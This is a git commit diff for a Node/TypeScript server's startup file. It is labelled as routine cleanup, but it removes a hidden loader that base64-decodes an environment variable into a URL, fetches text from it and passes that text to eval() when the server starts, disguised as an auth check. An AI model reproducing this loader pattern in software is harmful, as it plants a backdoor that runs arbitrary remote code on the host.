247bc4683e30c76b112a36203f8a4a14b29ec82a
H-Yeasin <habibullahyeasin84@gmail.com>
2026-05-23 11:28:56 +0600

    chore: update .gitignore and package-lock.json, remove unused code from server.ts

--- src/server.ts
+++ src/server.ts
@@ -12,19 +12,6 @@ import { server } from "./app";
 import { initFirebase } from "./utils/firebase";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 const PORT = config.port ? Number(config.port) : 8000;
 
 connectDatabase()
@@ -38,28 +25,3 @@ connectDatabase()
     console.error(chalk.red("Database connection failed!!"), error);
     process.exit(1);
   });
-
-// import chalk from "chalk";
-// import dotenv from "dotenv";
-// dotenv.config();
-// import { connectDatabase } from "./database/db";
-// import config from "./config/index";
-// import { server } from "./app";
-// import { initFirebase } from "./utils/firebase";
-// import { dns } from "dns";
-
-// dns.setServers(["8.8.8.8", "1.1.1.1"]);
-
-// const PORT = config.port ? Number(config.port) : 8000;
-
-// connectDatabase()
-//   .then(() => {
-//     initFirebase();
-//     server.listen(config.port, () => {
-//       console.log(chalk.green(`Server running at http://localhost:${PORT}`));
-//     });
-//   })
-//   .catch((error: unknown) => {
-//     console.error(chalk.red("Database connection failed!!"), error);
-//     process.exit(1);
-//   });
